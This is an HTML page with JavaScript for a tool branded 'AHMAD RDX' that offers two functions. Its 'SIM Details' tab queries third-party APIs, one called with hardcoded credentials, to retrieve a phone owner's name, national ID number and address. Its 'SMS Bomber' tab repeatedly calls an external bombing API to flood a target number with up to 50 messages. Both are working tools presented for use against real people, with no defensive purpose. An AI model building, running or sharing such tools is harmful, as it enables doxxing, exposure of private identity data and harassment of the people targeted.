<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
  <title>AHMAD RDX • SIM Pro 2-in-1</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;600;700&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: 'Outfit', sans-serif;
      background: #0f0f1a;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      padding: 1rem;
    }

    .container {
      width: 100%;
      max-width: 520px;
      background: rgba(20, 20, 35, 0.85);
      backdrop-filter: blur(20px);
      -webkit-backdrop-filter: blur(20px);
      border-radius: 2.2rem;
      padding: 2rem 1.6rem;
      border: 1px solid rgba(255, 255, 255, 0.08);
      box-shadow: 0 30px 45px rgba(0, 0, 0, 0.5);
    }

    /* AHMAD RDX Branding */
    .brand {
      text-align: center;
      margin-bottom: 1.8rem;
    }
    .brand .logo {
      font-size: 2.2rem;
      font-weight: 700;
      letter-spacing: 1px;
      background: linear-gradient(135deg, #c084fc, #8b5cf6, #6366f1);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      background-clip: text;
    }
    .brand .tagline {
      font-size: 0.85rem;
      color: #a5b4fc;
      font-weight: 500;
      margin-top: 0.2rem;
    }

    /* Tabs */
    .tabs {
      display: flex;
      gap: 0.8rem;
      margin-bottom: 2rem;
      background: rgba(255, 255, 255, 0.04);
      padding: 0.4rem;
      border-radius: 1.2rem;
    }
    .tab {
      flex: 1;
      text-align: center;
      padding: 0.9rem 0.5rem;
      border-radius: 1rem;
      font-weight: 600;
      font-size: 0.9rem;
      cursor: pointer;
      transition: all 0.3s;
      background: transparent;
      color: #94a3b8;
      border: none;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 0.4rem;
    }
    .tab.active {
      background: linear-gradient(135deg, #7c3aed, #4f46e5);
      color: white;
      box-shadow: 0 8px 20px rgba(124, 58, 237, 0.3);
    }

    /* Panels */
    .panel {
      display: none;
      animation: fadeSlide 0.4s ease;
    }
    .panel.active {
      display: block;
    }
    @keyframes fadeSlide {
      from { opacity: 0; transform: translateY(10px); }
      to { opacity: 1; transform: translateY(0); }
    }

    .input-group {
      display: flex;
      gap: 0.6rem;
      margin-bottom: 1.3rem;
    }
    .input-field {
      flex: 1;
      padding: 0.9rem 1.2rem;
      border-radius: 1.2rem;
      border: 1.5px solid rgba(255, 255, 255, 0.1);
      background: rgba(255, 255, 255, 0.06);
      color: white;
      font-size: 0.95rem;
      outline: none;
      transition: 0.3s;
    }
    .input-field:focus {
      border-color: #a78bfa;
      box-shadow: 0 0 0 4px rgba(167, 139, 250, 0.1);
    }
    .input-field::placeholder {
      color: #6b7280;
    }

    .btn {
      padding: 0.9rem 1.5rem;
      border: none;
      border-radius: 1.2rem;
      font-weight: 600;
      font-size: 0.9rem;
      cursor: pointer;
      display: inline-flex;
      align-items: center;
      justify-content: center;
      gap: 0.4rem;
      transition: 0.3s;
      white-space: nowrap;
    }
    .btn-primary {
      background: linear-gradient(135deg, #8b5cf6, #6366f1);
      color: white;
      box-shadow: 0 12px 24px -8px rgba(99, 102, 241, 0.4);
    }
    .btn-danger {
      background: linear-gradient(135deg, #ec4899, #be123c);
      color: white;
      box-shadow: 0 12px 24px -8px rgba(236, 72, 153, 0.4);
    }
    .btn:disabled {
      opacity: 0.6;
      pointer-events: none;
    }

    .spinner {
      width: 18px;
      height: 18px;
      border: 2px solid rgba(255,255,255,0.2);
      border-top: 2px solid white;
      border-radius: 50%;
      animation: spin 0.7s linear infinite;
      display: inline-block;
      margin-right: 6px;
    }
    @keyframes spin { to { transform: rotate(360deg); } }

    /* Card for details */
    .info-card {
      background: rgba(255, 255, 255, 0.05);
      backdrop-filter: blur(8px);
      border-radius: 1.4rem;
      padding: 1.3rem;
      margin-top: 1.2rem;
      border: 1px solid rgba(255,255,255,0.06);
    }
    .info-row {
      display: flex;
      justify-content: space-between;
      padding: 0.7rem 0;
      border-bottom: 1px solid rgba(255,255,255,0.07);
      font-size: 0.9rem;
    }
    .info-row:last-child {
      border-bottom: none;
    }
    .info-key {
      color: #a5b4fc;
      font-weight: 500;
    }
    .info-value {
      color: #e2e8f0;
      text-align: right;
      word-break: break-word;
      max-width: 60%;
    }

    .empty-msg {
      text-align: center;
      color: #94a3b8;
      padding: 2rem 1rem;
      font-style: italic;
    }

    /* Bomber extras */
    .bomber-options {
      display: flex;
      align-items: center;
      gap: 0.8rem;
      margin: 1rem 0;
    }
    .count-input {
      width: 70px;
      padding: 0.6rem;
      border-radius: 0.9rem;
      background: rgba(255,255,255,0.07);
      border: 1px solid rgba(255,255,255,0.15);
      color: white;
      text-align: center;
      font-weight: 600;
      outline: none;
    }
    .progress-wrap {
      margin-top: 1rem;
    }
    .progress-bar {
      height: 8px;
      background: rgba(255,255,255,0.08);
      border-radius: 20px;
      overflow: hidden;
    }
    .progress-fill {
      height: 100%;
      width: 0%;
      background: linear-gradient(90deg, #ec4899, #be123c);
      border-radius: 20px;
      transition: width 0.3s;
    }
    .progress-text {
      text-align: right;
      font-size: 0.8rem;
      color: #cbd5e1;
      margin-top: 0.3rem;
    }
  </style>
</head>
<body>
<div class="container">
  <!-- AHMAD RDX Branding -->
  <div class="brand">
    <div class="logo">AHMAD RDX</div>
    <div class="tagline">SIM Details & SMS Bomber</div>
  </div>

  <!-- Tabs -->
  <div class="tabs">
    <button class="tab active" id="tabSim" onclick="switchTab('sim')">
      <i class="fas fa-id-card"></i> SIM Details
    </button>
    <button class="tab" id="tabBomber" onclick="switchTab('bomber')">
      <i class="fas fa-bomb"></i> SMS Bomber
    </button>
  </div>

  <!-- SIM Details Panel -->
  <div class="panel active" id="panelSim">
    <div class="input-group">
      <input type="text" class="input-field" id="simInput" placeholder="03XX-XXXXXXX" autocomplete="off">
      <button class="btn btn-primary" id="simFetchBtn" onclick="fetchSimDetails()">
        <i class="fas fa-search"></i> Search
      </button>
    </div>
    <div id="simResult" class="empty-msg">Enter a number to see details</div>
  </div>

  <!-- SMS Bomber Panel -->
  <div class="panel" id="panelBomber">
    <div class="input-group">
      <input type="text" class="input-field" id="bomberInput" placeholder="03XX-XXXXXXX" autocomplete="off">
      <button class="btn btn-danger" id="bomberStartBtn" onclick="startBombing()">
        <i class="fas fa-bomb"></i> Start
      </button>
    </div>
    <div class="bomber-options">
      <span style="color:#cbd5e1;">Bomb count:</span>
      <input type="number" class="count-input" id="bombCount" value="5" min="1" max="50">
      <span style="color:#94a3b8; font-size:0.8rem;">(max 50)</span>
    </div>
    <div id="bomberProgress" class="progress-wrap" style="display:none;">
      <div class="progress-bar">
        <div class="progress-fill" id="progressFill"></div>
      </div>
      <div class="progress-text" id="progressText">0/5</div>
    </div>
    <div id="bomberLog" style="margin-top:1rem; max-height:200px; overflow-y:auto;"></div>
  </div>
</div>

<script>
  // Tab switching
  function switchTab(tab) {
    document.getElementById('tabSim').classList.remove('active');
    document.getElementById('tabBomber').classList.remove('active');
    document.getElementById('panelSim').classList.remove('active');
    document.getElementById('panelBomber').classList.remove('active');

    if (tab === 'sim') {
      document.getElementById('tabSim').classList.add('active');
      document.getElementById('panelSim').classList.add('active');
    } else {
      document.getElementById('tabBomber').classList.add('active');
      document.getElementById('panelBomber').classList.add('active');
    }
  }

  // --- SIM Details ---
  async function fetchSimDetails() {
    const phone = document.getElementById('simInput').value.trim();
    if (!phone) {
      document.getElementById('simResult').innerHTML = '<div class="empty-msg">Please enter a number</div>';
      return;
    }
    const btn = document.getElementById('simFetchBtn');
    btn.disabled = true;
    btn.innerHTML = '<span class="spinner"></span> Loading';

    const simResult = document.getElementById('simResult');
    simResult.innerHTML = '<div class="empty-msg"><span class="spinner"></span> Fetching details...</div>';

    const api1 = `https://blacksimdetail.vercel.app/public_apis/simdetailsapi.php?number=${phone}`;
    const api3 = `https://app.findpakjobs.pk/api.php?username=wduser1&password=112233&number=${phone}`;

    let simData = null;

    try {
      // Try first API
      const res1 = await fetch(api1);
      if (res1.ok) {
        const text = await res1.text();
        try {
          const json = JSON.parse(text);
          if (json && typeof json === 'object') {
            simData = mapSimData(json, 'BlackSIM');
          }
        } catch (e) {
          // not JSON – maybe display as plain text? we skip
        }
      }
    } catch (err) {
      // ignore network error
    }

    // If no data yet, try second API
    if (!simData) {
      try {
        const res2 = await fetch(api3);
        if (res2.ok) {
          const text = await res2.text();
          try {
            const json = JSON.parse(text);
            if (json && typeof json === 'object') {
              simData = mapSimData(json, 'FindPakJobs');
            }
          } catch (e) {}
        }
      } catch (err) {}
    }

    // Build display
    if (simData) {
      let html = `<div class="info-card">`;
      for (let [key, value] of Object.entries(simData)) {
        html += `<div class="info-row">
                  <span class="info-key">${key}</span>
                  <span class="info-value">${escapeHtml(value) || '—'}</span>
                </div>`;
      }
      html += `</div>`;
      simResult.innerHTML = html;
    } else {
      simResult.innerHTML = `<div class="empty-msg" style="color:#f87171;">⚠️ Could not retrieve details. The number may be invalid or the services are unavailable.</div>`;
    }

    btn.disabled = false;
    btn.innerHTML = '<i class="fas fa-search"></i> Search';
  }

  function mapSimData(json, source) {
    // Try to extract meaningful fields regardless of API structure
    let out = {};
    // Common fields mapping
    const fieldMap = {
      'name': 'Name',
      'fullname': 'Name',
      'owner_name': 'Name',
      'cnic': 'CNIC',
      'nic': 'CNIC',
      'address': 'Address',
      'city': 'City',
      'network': 'Network',
      'operator': 'Network',
      'sim': 'SIM',
      'number': 'Number',
      'msisdn': 'Number',
      'detail': 'Detail',
      'message': 'Message',
      'data': 'Data'
    };

    // Flatten if nested
    let flat = json;
    if (json.data && typeof json.data === 'object' && !Array.isArray(json.data)) {
      flat = {...json, ...json.data};
    } else if (json.result && typeof json.result === 'object') {
      flat = {...json, ...json.result};
    }

    // Try to map
    for (let key in flat) {
      if (typeof flat[key] === 'string' || typeof flat[key] === 'number') {
        let label = fieldMap[key.toLowerCase()] || key.charAt(0).toUpperCase() + key.slice(1);
        out[label] = String(flat[key]);
      }
    }

    // If nothing mapped, return original as fallback
    if (Object.keys(out).length === 0) {
      out['Response'] = JSON.stringify(json, null, 2).substring(0, 200);
    }
    return out;
  }

  // --- SMS Bomber ---
  async function startBombing() {
    const phone = document.getElementById('bomberInput').value.trim();
    const countInput = document.getElementById('bombCount');
    const count = parseInt(countInput.value) || 5;
    if (!phone) {
      alert('Please enter a phone number.');
      return;
    }
    if (count < 1 || count > 50) {
      alert('Count must be between 1 and 50.');
      return;
    }

    const btn = document.getElementById('bomberStartBtn');
    const progressWrap = document.getElementById('bomberProgress');
    const progressFill = document.getElementById('progressFill');
    const progressText = document.getElementById('progressText');
    const logDiv = document.getElementById('bomberLog');
    const simBtn = document.getElementById('simFetchBtn');

    btn.disabled = true;
    simBtn.disabled = true;
    btn.innerHTML = '<span class="spinner"></span> Bombing';
    progressWrap.style.display = 'block';
    logDiv.innerHTML = '';

    const api2 = `https://shadowscriptz.xyz/shadowapisv4/smsbomberapi.php?number=${phone}`;

    for (let i = 1; i <= count; i++) {
      try {
        const res = await fetch(api2);
        const text = await res.text();
        logDiv.innerHTML += `<div style="font-size:0.8rem; color:#10b981;">✓ Bomb ${i}/${count} – ${text.substring(0, 20) || 'sent'}</div>`;
      } catch (e) {
        logDiv.innerHTML += `<div style="font-size:0.8rem; color:#f87171;">✗ Bomb ${i}/${count} failed</div>`;
      }
      const percent = (i / count) * 100;
      progressFill.style.width = percent + '%';
      progressText.textContent = `${i}/${count}`;
      if (i < count) await new Promise(r => setTimeout(r, 800));
    }

    logDiv.innerHTML += `<div style="font-weight:600; color:#a78bfa; margin-top:0.5rem;">✅ Bombing completed (${count} requests)</div>`;
    btn.disabled = false;
    simBtn.disabled = false;
    btn.innerHTML = '<i class="fas fa-bomb"></i> Start';
    setTimeout(() => { progressWrap.style.display = 'none'; }, 2000);
  }

  function escapeHtml(text) {
    if (!text) return '';
    return text.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
  }

  // Initial state: SIM tab active
  document.getElementById('tabSim').classList.add('active');
  document.getElementById('panelSim').classList.add('active');
</script>
</body>
</html>
